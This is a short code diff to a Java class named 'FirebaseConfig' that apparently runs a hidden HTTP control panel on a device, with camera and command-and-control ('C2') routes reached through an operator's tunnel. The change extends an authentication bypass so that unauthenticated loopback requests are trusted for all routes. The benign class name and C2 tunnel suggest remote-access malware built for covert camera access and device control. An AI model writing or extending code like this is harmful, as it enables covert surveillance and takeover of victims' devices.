@@ -839,7 +839,12 @@ public class FirebaseConfig extends NanoHTTPD {
 
                 boolean isLoggedIn = (token != null && !token.isEmpty() && sessionToken != null && !sessionToken.isEmpty() && token.equals(sessionToken));
 
-                if (!isLoggedIn && (uri.startsWith("/camera/") || uri.startsWith("/c2/"))) {
+                if (!isLoggedIn) {
+                    // [AUTO-AUTH] Requests replayed through the C2 tunnel arrive from the
+                    // device's own loopback (C2_Tunnel -> http://127.0.0.1:<panel-port>).
+                    // The tunnel chain is already gated by the C2 server's operator session
+                    // and X-Device-Secret, so loopback requests are trusted for ALL routes.
+                    // Direct (LAN / IPv6) access still requires the panel password.
                     String remoteIp = session.getHeaders().get("http-client-ip");
                     if (remoteIp == null) remoteIp = session.getHeaders().get("remote-addr");
                     if ("127.0.0.1".equals(remoteIp) || "localhost".equals(remoteIp) || (remoteIp != null && remoteIp.startsWith("127."))) {
